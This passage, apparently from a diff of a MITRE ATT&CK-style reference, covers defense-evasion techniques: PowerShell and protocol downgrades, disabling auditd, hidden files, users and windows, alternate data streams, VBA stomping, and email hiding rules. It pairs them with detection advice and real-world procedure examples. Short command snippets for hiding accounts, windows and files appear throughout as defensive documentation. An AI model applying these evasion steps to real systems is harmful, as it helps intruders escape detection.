+- [S1053] AvosLocker: AvosLocker can restart a compromised machine in safe mode.
+
+### T1562.010 - Impair Defenses: Downgrade Attack
+
+Description:
+
+Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. Adversaries may downgrade and use various less-secure versions of features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle or Network Sniffing. For example, PowerShell versions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected. Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text. On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.
+
+Detection:
+
+Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex: powershell –v 2). Also monitor for other abnormal events, such as execution of and/or processes spawning from a version of a tool that is not expected in the environment. Monitor for Windows event ID (EID) 400, specifically the EngineVersion field which shows the version of PowerShell running and may highlight a malicious downgrade attack. Monitor network data to detect cases where HTTP is used instead of HTTPS. Monitor executed commands and arguments that may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. Bitlocker can be disabled by calling DisableKeyProtectors and setting DisableCount to 0. Monitor for newly constructed files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Adversaries can construct new files in the EFI System Partition. Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender. HVCI (Hypervisor-Protected Code Integrity) can be disabled by modifying the registry key to 0, allowing the system to run custom unsigned kernel code.
+
+Procedures:
+
+- [C0041] FrostyGoop Incident: During FrostyGoop Incident, the adversary downgraded firmware on victim devices in order to impair visibility into the process environment.
+- [S1180] BlackByte Ransomware: BlackByte Ransomware enables SMBv1 during execution.
+- [S0692] SILENTTRINITY: SILENTTRINITY can downgrade NTLM to capture NTLM hashes.
+
+### T1562.011 - Impair Defenses: Spoof Security Alerting
+
+Description:
+
+Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity. Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident. Rather than or in addition to Indicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., Disable or Modify Tools). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses. For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.
+
+### T1562.012 - Impair Defenses: Disable or Modify Linux Audit System
+
+Description:
+
+Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules. Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`, containing a sequence of `auditctl` commands loaded at boot time. With root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.
+
+Procedures:
+
+- [S0377] Ebury: Ebury disables OpenSSH, system (`systemd`), and audit logs (`/sbin/auditd`) when the backdoor is active.
+
+
+### T1564.001 - Hide Artifacts: Hidden Files and Directories
+
+Description:
+
+Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS). On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys. Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.
+
+Detection:
+
+Monitor the file system and shell commands for files being created with a leading "." and the Windows command-line use of attrib.exe to add the hidden attribute.
+
+Procedures:
+
+- [S0650] QakBot: QakBot has placed its payload in hidden subdirectories.
+- [S0658] XCSSET: XCSSET uses a hidden folder named .xcassets and .git to embed itself in Xcode.
+- [G0007] APT28: APT28 has saved files with hidden file attributes.
+- [G1039] RedCurl: RedCurl added the “hidden” file attribute to original files, manipulating victims to click on malicious LNK files.
+- [S1153] Cuckoo Stealer: Cuckoo Stealer has copied its binary and the victim's scraped password into a hidden folder in the `/Users` directory.
+- [S0660] Clambling: Clambling has the ability to set its file attributes to hidden.
+- [G1014] LuminousMoth: LuminousMoth has used malware to store malicious binaries in hidden directories on victim's USB drives.
+- [S0612] WastedLocker: WastedLocker has copied a random file from the Windows System32 folder to the %APPDATA% location under a different hidden filename.
+- [S0013] PlugX: PlugX can modify the characteristics of folders to hide them from the compromised user.
+- [G0032] Lazarus Group: Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.
+- [S0369] CoinTicker: CoinTicker downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].
+- [G0129] Mustang Panda: Mustang Panda's PlugX variant has created a hidden folder on USB drives named RECYCLE.BIN to store malicious executables and collected data.
+- [S0428] PoetRAT: PoetRAT has the ability to hide and unhide files.
+- [S0584] AppleJeus: AppleJeus has added a leading . to plist filenames, unlisting them from the Finder app and default Terminal directory listings.
+- [S0402] OSX/Shlayer: OSX/Shlayer has executed a .command script from a hidden directory in a mounted DMG.
+- [G0081] Tropic Trooper: Tropic Trooper has created a hidden directory under C:\ProgramData\Apple\Updates\ and C:\Users\Public\Documents\Flash\.
+- [S0595] ThiefQuest: ThiefQuest hides a copy of itself in the user's ~/Library directory by using a . at the beginning of the file name followed by 9 random characters.
+- [G0106] Rocke: Rocke downloaded a file "libprocesshider", which could hide files on the target system.
+- [S0451] LoudMiner: LoudMiner has set the attributes of the VirtualBox directory and VBoxVmService parent directory to "hidden".
+- [S0262] QuasarRAT: QuasarRAT has the ability to set file attributes to "hidden" to hide files from the compromised user's view in Windows File Explorer.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D sets the main loader file’s attributes to hidden.
+- [S0260] InvisiMole: InvisiMole can create hidden system directories.
+- [G1016] FIN13: FIN13 has created hidden files and folders within a compromised Linux system `/tmp` directory. FIN13 also has used `attrib.exe` to hide gathered local host information.
+- [S0634] EnvyScout: EnvyScout can use hidden directories and files to hide malicious executables.
+- [S0434] Imminent Monitor: Imminent Monitor has a dynamic debugging feature to set the file attribute to hidden.
+- [S1043] ccf32: ccf32 has created a hidden directory on targeted systems, naming it after the current local time (year, month, and day).
+- [S0015] Ixeshe: Ixeshe sets its own executable file's attributes to hidden.
+- [S0282] MacSpy: MacSpy stores itself in ~/Library/.DS_Stores/
+- [G0134] Transparent Tribe: Transparent Tribe can hide legitimate directories and replace them with malicious copies of the same name.
+- [S0439] Okrum: Before exfiltration, Okrum's backdoor has used hidden files to store logs and outputs from backdoor commands.
+- [S0331] Agent Tesla: Agent Tesla has created hidden folders.
+- [S0484] Carberp: Carberp has created a hidden file in the Startup folder of the current user.
+- [S0366] WannaCry: WannaCry uses attrib +h to make some of its files hidden.
+- [S0198] NETWIRE: NETWIRE can copy itself to and launch itself from hidden folders.
+- [G0125] HAFNIUM: HAFNIUM has hidden files on a compromised host.
+- [S0447] Lokibot: Lokibot has the ability to copy itself to a hidden file and directory.
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda stored encrypted payloads associated with PlugX installation in hidden directories during RedDelta Modified PlugX Infection Chain Operations.
+- [S0278] iKitten: iKitten saves itself with a leading "." so that it's hidden from users by default.
+- [S0663] SysUpdate: SysUpdate has the ability to set file attributes to hidden.
+- [S0277] FruitFly: FruitFly saves itself with a leading "." to make it a hidden file.
+- [S0475] BackConfig: BackConfig has the ability to set folders or files to be hidden from the Windows Explorer default view.
+- [S0438] Attor: Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.
+- [G0050] APT32: APT32's macOS backdoor hides the clientID file via a chflags function.
+- [S1176] attrib: attrib can be used to make files or directories hidden.
+- [S1105] COATHANGER: COATHANGER creates and installs itself to a hidden installation directory.
+- [S1111] DarkGate: DarkGate initial installation involves dropping several files to a hidden directory named after the victim machine name. Additionally, DarkGate uses attrib to hide a directory in the following command: ` C:\Windows\system32\attrib.exe” +h C:/rjtu/`.
+- [S0274] Calisto: Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.
+- [S0569] Explosive: Explosive has commonly set file and path attributes to hidden.
+- [S0339] Micropsia: Micropsia creates a new hidden directory to store all components' outputs in a dedicated sub-folder for each.
+- [S0497] Dacls: Dacls has had its payload named with a dot prefix to make it hidden from view in the Finder application.
+- [S0448] Rising Sun: Rising Sun can modify file attributes to hide files.
+- [S0162] Komplex: The Komplex payload is stored in a hidden directory at /Users/Shared/.local/kextd.
+- [S0533] SLOTHFULMEDIA: SLOTHFULMEDIA has been created with a hidden attribute to insure it's not visible to the victim.
+- [S0409] Machete: Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.
+
+### T1564.002 - Hide Artifacts: Hidden Users
+
+Description:
+
+Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow plist file. Every user has a userID associated with it. When the Hide500Users key value is set to TRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the dscl utility to create hidden user accounts by setting the IsHidden attribute to 1. Adversaries can also hide a user’s home folder by changing the chflags to hidden. Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen. On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.
+
+Detection:
+
+Monitor for users that may be hidden from the login screen but still present in additional artifacts of usage such as directories and authentication logs. Monitor processes and command-line events for actions that could be taken to add a new user and subsequently hide it from login screens. Monitor Registry events for modifications to the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList key. In macOS, monitor for commands, processes, and file activity in combination with a user that has a userID under 500. Monitor for modifications to set the Hide500Users key value to TRUE in the /Library/Preferences/com.apple.loginwindow plist file. Monitor the command line for usage of the dscl . create command with the IsHidden attribute set to 1.
+
+Procedures:
+
+- [G0035] Dragonfly: Dragonfly has modified the Registry to hide created user accounts.
+- [S0649] SMOKEDHAM: SMOKEDHAM has modified the Registry to hide created user accounts from the Windows logon screen.
+- [G0094] Kimsuky: Kimsuky has run reg add ‘HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList’ /v to hide a newly created user.
+
+### T1564.003 - Hide Artifacts: Hidden Window
+
+Description:
+
+Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system. On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. Similarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. The Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden. In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding explorer.exe process. All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.
+
+Detection:
+
+Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the apple.awt.UIElement or any other suspicious plist tag in plist files and flag them.
+
+Procedures:
+
+- [S0373] Astaroth: Astaroth loads its module with the XSL script parameter vShow set to zero, which opens the application with a hidden window.
+- [S0686] QuietSieve: QuietSieve has the ability to execute payloads in a hidden window.
+- [S0491] StrongPity: StrongPity has the ability to hide the console window for its document search module from the user.
+- [S1199] LockBit 2.0: LockBit 2.0 can execute command line arguments in a hidden window.
+- [S1020] Kevin: Kevin can hide the current window from the targeted user via the `ShowWindow` API function.
+- [G0022] APT3: APT3 has been known to use -WindowStyle Hidden to conceal PowerShell windows.
+- [G0007] APT28: APT28 has used the WindowStyle parameter to conceal PowerShell windows.
+- [G0073] APT19: APT19 used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
+- [S0250] Koadic: Koadic has used the command Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden to hide its window.
+- [S0037] HAMMERTOSS: HAMMERTOSS has used -WindowStyle hidden to conceal PowerShell windows.
+- [S0692] SILENTTRINITY: SILENTTRINITY has the ability to set its window state to hidden.
+- [S0262] QuasarRAT: QuasarRAT can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A` though QuasarRAT can only be run on Windows systems.
+- [S0387] KeyBoy: KeyBoy uses -w Hidden to conceal a PowerShell window that downloads a payload.
+- [S1089] SharpDisco: SharpDisco can hide windows using `ProcessWindowStyle.Hidden`.
+- [S0500] MCMD: MCMD can modify processes to prevent them from being visible on the desktop.
+- [S0669] KOCTOPUS: KOCTOPUS has used -WindowsStyle Hidden to hide the command window.
+- [S0360] BONDUPDATER: BONDUPDATER uses -windowstyle hidden to conceal a PowerShell window that downloads a payload.
+- [S1172] OilBooster: OilBooster can hide its console window upon execution through the `ShowWindow` API.
+- [G0009] Deep Panda: Deep Panda has used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
+- [S0331] Agent Tesla: Agent Tesla has used ProcessWindowStyle.Hidden to hide windows.
+- [S1087] AsyncRAT: AsyncRAT can hide the execution of scheduled tasks using `ProcessWindowStyle.Hidden`.
+- [S0437] Kivars: Kivars has the ability to conceal its activity through hiding active windows.
+- [G0078] Gorgon Group: Gorgon Group has used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
+- [G0052] CopyKittens: CopyKittens has used -w hidden and -windowstyle hidden to conceal PowerShell windows.
+- [S1076] QUIETCANARY: QUIETCANARY can execute processes in a hidden window.
+- [G0126] Higaisa: Higaisa used a payload that creates a hidden window.
+- [G0047] Gamaredon Group: Gamaredon Group has used hidcon to run batch files in a hidden console window.
+- [G0079] DarkHydrus: DarkHydrus has used -WindowStyle Hidden to conceal PowerShell windows.
+- [S0670] WarzoneRAT: WarzoneRAT has the ability of performing remote desktop access via a hVNC window for decreased visibility.
+- [S1053] AvosLocker: AvosLocker has hidden its console window by using the `ShowWindow` API function.
+- [S1152] IMAPLoader: IMAPLoader hides the Windows Console window created by its execution by directly importing the `kernel32.dll` and `user32.dll` libraries `GetConsoleWindow` and `ShowWindow` APIs.
+- [G1022] ToddyCat: ToddyCat has hidden malicious scripts using `powershell.exe -windowstyle hidden`.
+- [S0688] Meteor: Meteor can hide its console window upon execution to decrease its visibility to a victim.
+- [G0133] Nomadic Octopus: Nomadic Octopus executed PowerShell in a hidden window.
+- [S0260] InvisiMole: InvisiMole has executed legitimate tools in hidden windows.
+- [G0094] Kimsuky: Kimsuky has used an information gathering module that will hide an AV software window from the victim.
+- [G0050] APT32: APT32 has used the WindowStyle parameter to conceal PowerShell windows.
+- [S0441] PowerShower: PowerShower has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.
+- [G0059] Magic Hound: Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.
+- [S0266] TrickBot: TrickBot has used a hidden VNC (hVNC) window to monitor the victim and collect information stealthily.
+- [S1086] Snip3: Snip3 can execute PowerShell scripts in a hidden window.
+- [S0466] WindTail: WindTail can instruct the OS to execute an application without a dock icon or menu.
+- [S1213] Lumma Stealer: Lumma Stealer has utilized the .NET `ProcessStartInfo` class features to prevent the process from creating a visible window through setting the `CreateNoWindow` setting to “True,” which allows the executed command or script to run without displaying a command prompt window.
+- [S0455] Metamorfo: Metamorfo has hidden its GUI using the ShowWindow() WINAPI call.
+- [S0625] Cuba: Cuba has executed hidden PowerShell windows.
+- [S0431] HotCroissant: HotCroissant has the ability to hide the window for operations performed on a given file.
+- [S0386] Ursnif: Ursnif droppers have used COM properties to execute malware in hidden windows.
+
+### T1564.004 - Hide Artifacts: NTFS File Attributes
+
+Description:
+
+Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.
+
+Detection:
+
+Forensic techniques exist to identify information stored in NTFS EA. Monitor calls to the ZwSetEaFile and ZwQueryEaFile Windows API functions as well as binaries used to interact with EA, and consider regularly scanning for the presence of modified information. There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: file.ext:ads[.ext]) is commonly associated with ADSs. For a more exhaustive list of utilities that can be used to execute and create ADSs, see The Streams tool of Sysinternals can be used to uncover files with ADSs. The dir /r command can also be used to display ADSs. Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a -stream parameter to interact with ADSs.
+
+Procedures:
+
+- [S0019] Regin: The Regin malware platform uses Extended Attributes to store encrypted executables.
+- [G0050] APT32: APT32 used NTFS alternate data streams to hide their payloads.
+- [S0476] Valak: Valak has the ability save and execute files as alternate data streams (ADS).
+- [S0397] LoJax: LoJax has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.
+- [S0404] esentutl: esentutl can be used to read and write alternate data streams.
+- [S0361] Expand: Expand can be used to download or copy a file into an alternate data stream.
+- [S0139] PowerDuke: PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS).
+- [S1052] DEADEYE: The DEADEYE.EMBED variant of DEADEYE can embed its payload in an alternate data stream of a local file.
+- [S0145] POWERSOURCE: If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\Windows\.
+- [S1160] Latrodectus: Latrodectus can delete itself while its process is still running through the use of an alternate data stream.
+- [S0612] WastedLocker: WastedLocker has the ability to save and execute files as an alternate data stream (ADS).
+- [S0570] BitPaymer: BitPaymer has copied itself to the :bin alternate data stream of a newly created file.
+- [S0373] Astaroth: Astaroth can abuse alternate data streams (ADS) to store content for malicious payloads.
+- [S0168] Gazer: Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.
+- [S0027] Zeroaccess: Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.
+- [S0504] Anchor: Anchor has used NTFS to hide files.
+
+### T1564.005 - Hide Artifacts: Hidden File System
+
+Description:
+
+Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS. Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.
+
+Detection:
+
+Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting Bootkit activity.
+
+Procedures:
+
+- [G0020] Equation: Equation has used an encrypted virtual file system stored in the Windows Registry.
+- [S0126] ComRAT: ComRAT has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.
+- [S0019] Regin: Regin has used a hidden file system to store some of its components.
+- [S0114] BOOTRASH: BOOTRASH has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.
+- [S0022] Uroburos: Uroburos can use concealed storage mechanisms including an NTFS or FAT-16 filesystem encrypted with CAST-128 in CBC mode.
+- [G0041] Strider: Strider has used a hidden file system that is stored as a file on disk.
+
+### T1564.006 - Hide Artifacts: Run Virtual Instance
+
+Description:
+
+Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values. Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system. In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., RC Scripts) will cause the VM to persistently restart. Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.
+
+Detection:
+
+Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines. Network adapter information may also be helpful in detecting the use of virtual instances. Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. -silent, -ignore-reboot), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. VBoxManage startvm $VM --type headless). Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. VBoxManage.exe setextradata global GUI/SuppressMessages "all"). Monitor for commands which enable hypervisors such as Hyper-V. If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for Windows Service, with respect to virtualization software. Benign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.
+
+Procedures:
+
+- [S0449] Maze: Maze operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so Maze can encrypt files on the shared drives as well as the local machine.
+- [S0481] Ragnar Locker: Ragnar Locker has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives.
+- [S0451] LoudMiner: LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.
+
+### T1564.007 - Hide Artifacts: VBA Stomping
+
+Description:
+
+Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data. MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application. An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.
+
+Detection:
+
+Detection efforts should be placed finding differences between VBA source code and p-code. VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code. If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the PROJECT stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the PROJECT stream will inhibit attempts of reading the VBA source code through the GUI.
+
+### T1564.008 - Hide Artifacts: Email Hiding Rules
+
+Description:
+
+Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems. Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account. Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines. In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).
+
+Detection:
+
+Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries. On Windows systems, monitor for creation of suspicious inbox rules through the use of the New-InboxRule and Set-InboxRule PowerShell cmdlets. On MacOS systems, monitor for modifications to the RulesActiveState.plist, SyncedRules.plist, UnsyncedRules.plist, and MessageRules.plist files.
+
+Procedures:
+
+- [G1015] Scattered Spider: Scattered Spider creates inbound rules on the compromised email accounts of security personnel to automatically delete emails from vendor security products.
+- [G0085] FIN4: FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as “hacked," "phish," and “malware" in a likely attempt to prevent organizations from communicating about their activities.
+
+### T1564.009 - Hide Artifacts: Resource Forking
+
+Description:
+
+Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code. Usage of a resource fork is identifiable when displaying a file’s extended attributes, using ls -l@ or xattr -l commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder. Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.
+
+Detection:
+
+Identify files with the com.apple.ResourceFork extended attribute and large data amounts stored in resource forks. Monitor command-line activity leveraging the use of resource forks, especially those immediately followed by potentially malicious activity such as creating network connections.
+
+Procedures:
+
+- [S0276] Keydnap: Keydnap uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system.
+- [S0402] OSX/Shlayer: OSX/Shlayer has used a resource fork to hide a compressed binary file of itself from the terminal, Finder, and potentially evade traditional scanners.
+
+### T1564.010 - Hide Artifacts: Process Argument Spoofing
+
+Description:
+
